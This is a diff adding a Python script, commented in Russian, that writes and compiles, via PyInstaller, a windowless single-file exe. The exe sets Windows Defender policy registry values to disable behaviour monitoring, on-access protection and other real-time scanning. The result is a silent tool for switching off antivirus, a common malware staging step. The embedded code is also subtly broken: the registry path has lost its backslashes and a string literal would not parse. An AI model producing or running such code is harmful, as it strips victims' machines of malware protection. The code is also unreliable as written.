@@ -1,0 +1,54 @@
+import subprocess
+
+# Код для создания ключей и параметров в реестре
+registry_code = r'''
+import winreg
+
+def create_registry_keys():
+    base_path = r"SOFTWAREPoliciesMicrosoftWindows Defender"
+    sub_key = r"Real-Time Protection"
+    full_path = base_path + "\" + sub_key
+    
+    try:
+        # Открываем или создаём ключ Real-Time Protection в HKLM
+        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, full_path, 0, winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY)
+        
+        # Список параметров и значение для них
+        params = [
+            "DisableBehaviourMonitoring",
+            "DisableOnAccessProtection",
+            "DisableScanOnRealTimeEnable",
+            "DisableIOAVPProtection"
+        ]
+        value = 1
+        
+        # Создаём параметры DWORD и устанавливаем значение
+        for param in params:
+            winreg.SetValueEx(key, param, 0, winreg.REG_DWORD, value)
+            print(f"Установлен параметр {param} = {value}")
+        
+        winreg.CloseKey(key)
+        print("Все параметры успешно созданы.")
+        
+    except PermissionError:
+        print("Ошибка: недостаточно прав. Запустите скрипт от имени администратора.")
+    except Exception as e:
+        print(f"Произошла ошибка: {e}")
+
+if __name__ == "__main__":
+    create_registry_keys()
+'''
+
+# Запись исходного кода в файл
+with open("create_reg_keys.py", "w", encoding="utf-8") as f:
+    f.write(registry_code)
+
+# Компиляция с помощью PyInstaller в один независимый exe-файл без консоли
+subprocess.run([
+    "pyinstaller",
+    "--onefile",
+    "--windowed",
+    "create_reg_keys.py"
+])
+
+print("Компиляция завершена. Файл exe находится в папке dist.")
